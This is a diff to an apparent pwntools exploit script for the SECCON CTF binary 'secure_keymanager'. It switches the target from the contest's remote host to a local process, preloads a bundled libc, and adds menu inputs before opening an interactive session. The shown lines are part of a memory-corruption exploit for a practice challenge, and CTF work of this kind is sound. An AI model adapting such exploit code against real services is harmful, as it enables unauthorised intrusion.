@@ -1,8 +1,8 @@
 from pwn import *
 
 os.environ['LD_PRELOAD'] = './libc-2.23.so'
-#r = process('./secure_keymanager')
-r = remote('secure_keymanager.pwn.seccon.jp', 47225)
+r = process('./secure_keymanager')
+#r = remote('secure_keymanager.pwn.seccon.jp', 47225)
 e = ELF('./secure_keymanager')
 libc = ELF('./libc-2.23.so')
 #context.log_level = 'debug'
@@ -76,4 +76,7 @@ r.sendafter('Input Account Name >> ', name)
 r.sendafter('Input Master Pass >> ', p)
 r.sendafter('Input id to edit...', '3')
 r.sendafter('Input new key...', '\x00'*0x20)
+
+r.sendafter('>> ', '1')
+r.sendafter('Input key length...', '1')
 r.interactive()
